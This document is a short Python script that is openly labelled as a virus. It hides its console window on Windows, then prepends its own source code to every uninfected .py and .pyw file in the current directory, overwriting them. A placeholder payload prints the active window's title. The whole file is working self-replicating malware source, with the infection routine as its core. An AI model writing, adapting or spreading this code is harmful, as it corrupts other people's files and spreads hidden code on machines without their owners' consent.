# VIRUS SAYS HI!
import sys
import glob
import ctypes       # For interfacing with C functions

from pip._vendor.distlib.compat import raw_input

kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
user32 = ctypes.windll.user32       # Access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console

def get_current_window():  # Function to grab the current window and its title

    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()  # Get handle to foreground window
    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar, passing the handle as argument
    buff = ctypes.create_unicode_buffer(length + 1)  # Create buffer to store the window title string

    GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff

    return buff.value  # Return the value of buff

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()


self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    if (get_current_window() ==  "cmd - python  main.py"):
        print(get_current_window())
        raw_input('press any key')
    else:
        print(get_current_window())
        raw_input('press any key')


malicious_code()
